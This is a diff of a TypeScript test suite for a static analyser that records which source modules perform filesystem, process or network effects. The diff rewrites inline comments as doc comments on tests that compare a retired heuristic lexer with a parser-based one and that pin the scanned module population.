       'a regex literal containing a BACKTICK, in operand position',
       'a nested template literal inside a `${…}` substitution',
     ]);
   });
 
+  /** The false negative: the module imports `node:fs`, and the detector with the retired lexer reports no effect. */
   it('EffectLedger_RegexHoldingABacktick_HidesARealFilesystemImportFromTheHeuristic', () => {
-    // The FALSE-NEGATIVE kill, carried all the way to the verdict. This is the
-    // dangerous direction for a fail-closed census: the module really does
-    // import `node:fs`, and the retired lexer reported nothing at all.
     const source = [
       'export function isTick(s: string): boolean { return /`/.test(s); }',
       "import { readFile } from 'node:fs';",
@@ -902,10 +795,8 @@ describe('DR-26 kill fixture — where the heuristic and a real parse disagree',
     ]);
   });
 
+  /** The false positive: the module imports nothing, and the detector with the retired lexer reports a process effect. */
   it('EffectLedger_NestedTemplateSubstitution_MakesTheHeuristicInventAnEffect', () => {
-    // The FALSE-POSITIVE kill. The module header used to promise "the census can
-    // under-report a smuggled effect, but it never invents one". It could, and
-    // this is the input on which it did.
     const source =
       'export const doc = `outer ${ `inner from \'node:child_process\' text` } end`;';
 
@@ -920,11 +811,11 @@ describe('DR-26 kill fixture — where the heuristic and a real parse disagree',
     expect(detectModuleEffects('quiet/doc.ts', source, lexModule)).toEqual([]);
   });
 
+  /**
+   * The retired mask has the same defect: it leaves the text of a nested template unmasked.
+   * A `${…}` substitution is code, so the port detects a real ambient call inside one. The retired mask hides that call.
+   */
   it('EffectLedger_NestedTemplateSubstitution_AlsoDefeatedTheAmbientMask', () => {
-    // The same defect in the OTHER retired walk, which is why one port answers
-    // both questions from one parse. The documented trust boundary claimed
-    // "maskNonCode masks a template literal whole, so an ambient-global call
-    // written inside `${…}` is masked with it". It did not.
     const source = 'export const doc = `outer ${ `inner fetch(u) text` } end`;';
 
     expect(maskNonCode(source, SUPERSEDED_LEXER)).toContain('fetch(');
@@ -935,8 +826,6 @@ describe('DR-26 kill fixture — where the heuristic and a real parse disagree',
     ]);
     expect(detectModuleEffects('quiet/doc.ts', source, lexModule)).toEqual([]);
 
-    // …and the substitution ITSELF is code, so a real ambient call written in a
-    // `${…}` is now SEEN. That closes the carve-out rather than restating it.
     const inSubstitution = 'export const doc = `outer ${ fetch(u) } end`;';
     expect(detectModuleEffects('rogue/interp.ts', inSubstitution, SUPERSEDED_LEXER)).toEqual([]);
     expect(detectModuleEffects('rogue/interp.ts', inSubstitution, lexModule)).toEqual([
@@ -944,13 +833,11 @@ describe('DR-26 kill fixture — where the heuristic and a real parse disagree',
     ]);
   });
 
+  /**
+   * An `import('p').T` type query is erased at emit, so it is an import edge but not an effect site.
+   * The port tags it type-only. The retired walk reports it as a runtime filesystem effect.
+   */
   it('EffectLedger_ImportTypeQuery_IsAnEdgeButNotAnEffect', () => {
-    // `import('p').T` is erased at emit, so it is not an effect site — but it IS
-    // an import edge, which `layer-boundaries-seam.ts` consumes. The retired
-    // walk got this backwards: it recorded type queries as VALUE imports (it
-    // matched the `import(` token and never saw the type position), which is why
-    // `verbs/worktree/manager.ts` reported `node:fs` twice on the live
-    // tree. The port tags them type-only so both consumers can be right.
     const source = [
       "export type Handle = import('node:fs').Stats | null;",
       'export const zero = 0;',
@@ -962,18 +849,16 @@ describe('DR-26 kill fixture — where the heuristic and a real parse disagree',
     expect(extractImportSpecifiers(source, lexModule)).toEqual(['node:fs']);
     expect(detectModuleEffects('x/types.ts', source, lexModule)).toEqual([]);
 
-    // The retired walk charged it as a runtime filesystem effect.
     expect(detectModuleEffects('x/types.ts', source, SUPERSEDED_LEXER)).toEqual([
       { module: 'x/types.ts', effectClass: 'filesystem', evidence: 'node:fs' },
     ]);
   });
 
+  /**
+   * `ts.createSourceFile` does not throw on broken input. It returns a partial tree with missing nodes.
+   * A module that loses its imports reads as effect-free and passes, so the port refuses a recovered parse.
+   */
   it('EffectLedger_RecoveredParse_IsRefusedRatherThanUnderReported', () => {
-    // `ts.createSourceFile` never throws: handed broken input it returns a
-    // partial tree with nodes silently missing. For this census an under-count
-    // is the dangerous direction — a module whose imports vanished reads as
-    // effect-free and PASSES — so the port refuses a recovered parse instead of
-    // averaging it in.
     const broken = "import { readFile } from 'node:fs'\nexport const x = {{{;";
     expect(() => lexModule(broken, 'rogue/broken.ts')).toThrow(/did not parse cleanly/);
     expect(() => detectModuleEffects('rogue/broken.ts', broken, lexModule)).toThrow(
@@ -981,9 +866,11 @@ describe('DR-26 kill fixture — where the heuristic and a real parse disagree',
     );
   });
 
+  /**
+   * The retired walk exists only as the second half of the measurement in this suite, so no shipped module can import it.
+   * The walk must reach each tracked module in its scope, or an import of the retired walk can sit in the gap.
+   */
   it('EffectLedger_NoShippedModuleImportsTheSupersededLexer', async () => {
-    // The retired walk is retained ONLY as the other half of the measurement
-    // above. If shipped source ever imports it again, the defect is back.
     const { readdir, readFile } = await import('node:fs/promises');
     const files: string[] = [];
     const walk = async (dir: string): Promise<void> => {
@@ -997,9 +884,6 @@ describe('DR-26 kill fixture — where the heuristic and a real parse disagree',
       }
     };
     await walk(SRC_ROOT);
-    // NON-EMPTY DENOMINATOR, DERIVED (task 079): a walk that resolved nothing —
-    // or merely resolved LESS than the tree holds — would pass vacuously over
-    // whatever it happened to miss.
     expect(
       trackedFilesMissedBy(
         files.map((file) => relative(SRC_ROOT, file).replaceAll('\\', '/')),
@@ -1044,10 +928,11 @@ describe('DR-26 non-empty denominator — a scan that resolved nothing FAILS', (
     expect(result.moduleCount).toBe(0);
   });
 
+  /**
+   * The module count is healthy, but the lexer resolved no specifier.
+   * Such a scan looks the same as a tree that imports nothing.
+   */
   it('EffectLedger_LexerResolvingZeroSpecifiers_FailsRatherThanReportingACleanTree', () => {
-    // The population is healthy; the LEXER answered nothing. Import-shape rules
-    // 1–4 therefore ranged over an empty surface, which looks exactly like a tree
-    // that imports nothing — and reads as a pass.
     const result = runEffectLedgerCensus(
       { occurrences: [claimed], moduleCount: 587, specifierCount: 0 },
       rules,
@@ -1057,33 +942,26 @@ describe('DR-26 non-empty denominator — a scan that resolved nothing FAILS', (
     expect(result.specifierCount).toBe(0);
   });
 
+  /**
+   * The caller supplies the lexer port, so a caller can pass a lexer that resolves nothing.
+   * That lexer must not give a green census over the real tree.
+   * The module count must reach the tracked count, so the failure comes from the lexer and not from a collapsed walk.
+   */
   it('EffectLedger_MuteLexerOverTheLiveTree_FailsTheCensus', async () => {
-    // End to end, over the REAL tree, through the port: a lexer that resolves
-    // nothing must not produce a green census. This is the tooth that makes the
-    // inversion safe — the port is caller-supplied, so a caller CAN pass one
-    // that answers nothing.
     const mute: ModuleLexer = () => ({ imports: [], maskedSource: '' });
     const result = await auditEffectOwnership(SRC_ROOT, mute);
-    // The MODULE population must be healthy for this arm to say anything: the
-    // claim is "the lexer answered nothing over a full tree", not "the walk also
-    // collapsed". Pinned to the tracked count rather than a `> 100` floor.
     expect(result.moduleCount).toBeGreaterThanOrEqual((await trackedScannableModules()).length);
     expect(result.specifierCount).toBe(0);
     expect(result.ok).toBe(false);
     expect(result.diagnostics.map((d) => d.code)).toContain('EMPTY_SPECIFIER_DENOMINATOR');
   });
 
+  /**
+   * The module count has a bound on each side of the tracked count.
+   * A count below the tracked count means that the walk lost part of the tree.
+   * A count more than 10% above it means that an exclusion stopped, so the census judges harness code.
+   */
   it('EffectLedger_LiveTree_ResolvesANonEmptyModuleAndSpecifierPopulation', async () => {
-    // The positive half: the teeth above are only meaningful if the real scan
-    // covers the tree. "By a wide margin" was the old wording and the old defect
-    // — `> 100` against ~600 modules is not a margin, it is a blind spot with a
-    // number written on it. The pin is now TWO-SIDED against the tracked count
-    // (task 079), because both directions are real failures:
-    //
-    //   • fewer than tracked  → the walk lost part of the tree, and every
-    //     ownership verdict above ranged over the remainder;
-    //   • far more than tracked → an exclusion stopped working, so the census is
-    //     judging `__tests__`/`evals` harness code by shipped-source rules.
     const tracked = await trackedScannableModules();
     const scan = await scanEffectTree(SRC_ROOT, lexModule);
     expect(scan.moduleCount).toBeGreaterThanOrEqual(tracked.length);
@@ -1096,25 +974,21 @@ describe('DR-26 non-empty denominator — a scan that resolved nothing FAILS', (
     expect(scan.occurrences.length).toBeGreaterThan(0);
   });
 
+  /**
+   * The scan root of a guard is part of its claim.
+   * `GOVERNED_SOURCE_ROOT` must resolve to the tree that this audit scans, and that tree must hold tracked modules.
+   */
   it('EffectLedger_DeclaredGovernedRoot_IsTheRootTheLiveAuditWalks', async () => {
-    // DR-8, task 079 — a guard's scan root is part of its claim, so the claim has
-    // to be checkable. The header used to say "the shipped source" while every
-    // live caller passed `servers/exarchos-mcp/src`: prose asserting a
-    // repository-wide property over one subtree, with nothing to catch the drift.
-    //
-    // `GOVERNED_SOURCE_ROOT` is now the single authority, and this resolves it
-    // against the repo root to show it names the tree the audit is pointed at.
     expect(resolve(REPO_ROOT, GOVERNED_SOURCE_ROOT)).toBe(resolve(SRC_ROOT));
 
-    // …and it names a real, populated tree, not a path that resolves to nothing.
     expect((await trackedScannableModules()).length).toBeGreaterThan(0);
   });
 
+  /**
+   * `src/verbs` alone holds more than 100 modules, so a fixed floor of 100 accepts a scan of that slice as a full scan.
+   * The pin against the tracked count rejects the narrowed scan.
+   */
   it('EffectLedgerPopulationPin_NarrowedScanRoot_FailsInsteadOfPassing', async () => {
-    // KILL FIXTURE. `src/verbs` alone holds well over the retired `> 100`
-    // floor — so a census narrowed to it read as a full-tree scan while every
-    // "no unowned effect" verdict above was in fact measured over a slice of
-    // the tree.
     const narrowed = await scanEffectTree(join(SRC_ROOT, 'verbs'), lexModule);
     expect(
       narrowed.moduleCount,
@@ -1122,7 +996,6 @@ describe('DR-26 non-empty denominator — a scan that resolved nothing FAILS', (
         'nothing about what that floor let through',
     ).toBeGreaterThan(100);
 
-    // The derived pin rejects it.
     expect(narrowed.moduleCount).toBeLessThan((await trackedScannableModules()).length);
   });
 });
